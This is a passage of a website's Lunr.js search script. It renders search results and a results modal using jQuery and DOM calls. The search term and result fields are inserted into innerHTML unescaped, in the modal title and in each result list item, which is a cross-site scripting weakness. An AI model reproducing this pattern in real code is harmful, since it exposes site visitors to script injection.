                var body = documents[ref]['body'].substring(0,160)+'...';
                document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML = document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML + "<li class='lunrsearchresult'><a href='" + url + "'><span class='title'>" + title + "</span><span class='body'>"+ body +"</span><span class='url'>"+ url +"</span></a></li>";
            }
        } else {
            document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML = "<li class='lunrsearchresult'>No results found...</li>";
        }
    }
    return false;
}

function lunr_search(term) {
    $('#lunrsearchresults').show( 400 );
    $( "body" ).addClass( "modal-open" );
    
    document.getElementById('lunrsearchresults').innerHTML = '<div id="resultsmodal" class="modal fade show d-block"  tabindex="-1" role="dialog" aria-labelledby="resultsmodal"> <div class="modal-dialog shadow" role="document"> <div class="modal-content"> <div class="modal-header" id="modtit"> <button type="button" class="close" id="btnx" data-dismiss="modal" aria-label="Close"> &times; </button> </div> <div class="modal-body"> <ul class="mb-0"> </ul>    </div> <div class="modal-footer"><button id="btnx" type="button" class="btn btn-primary btn-sm" data-dismiss="modal">Close</button></div></div> </div></div>';
    if(term) {
        document.getElementById('modtit').innerHTML = "<h5 class='modal-title'>Search results for '" + term + "'</h5>" + document.getElementById('modtit').innerHTML;
        //put results on the screen.
        var results = idx.search(term);
        if(results.length>0){
            //console.log(idx.search(term));
            //if results
            for (var i = 0; i < results.length; i++) {
                // more statements
                var ref = results[i]['ref'];
                var url = documents[ref]['url'];
                var title = documents[ref]['title'];
                var body = documents[ref]['body'].substring(0,160)+'...';
                document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML = document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML + "<li class='lunrsearchresult'><a href='" + url + "'><span class='title'>" + title + "</span><small><span class='body'>"+ body +"</span><span class='url'>"+ url +"</span></small></a></li>";
            }
        } else {
            document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML = "<li class='lunrsearchresult'>Sorry, no results found. Close & try a different search!</li>";
        }
    }
    return false;
}
    
$(function() {
    $("#lunrsearchresults").on('click', '#btnx', function () {
        $('#lunrsearchresults').hide( 5 );
        $( "body" ).removeClass( "modal-open" );
    });
});